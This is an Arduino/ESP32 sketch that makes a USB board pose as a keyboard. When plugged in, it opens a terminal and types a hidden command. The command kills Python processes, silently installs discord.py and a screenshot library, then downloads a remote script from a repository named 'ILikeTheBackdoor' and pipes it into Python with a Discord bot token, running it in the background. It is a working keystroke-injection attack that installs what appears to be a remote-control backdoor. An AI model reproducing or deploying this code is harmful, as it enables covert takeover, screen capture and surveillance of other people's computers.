#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
  delay(3000);
  
  Keyboard.begin();
  USB.begin();

  Keyboard.write(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(2000);

  Keyboard.print("terminal");
  delay(750);
  Keyboard.write(KEY_RETURN);
  delay(3000);

  Keyboard.print("pkill -9 -f 'python3 -' || true; python3 -m pip install --user discord.py mss --break-system-packages > /dev/null 2>&1 && export DISPLAY=:0 && curl -sSL https://raw.githubusercontent.com/StraightDopamine/ILikeTheBackdoor/refs/heads/main/Radon.py | python3 - 'your own discord bot token' &> /dev/null &\n");

}
void loop() {
  // put your main code here, to run repeatedly:
}
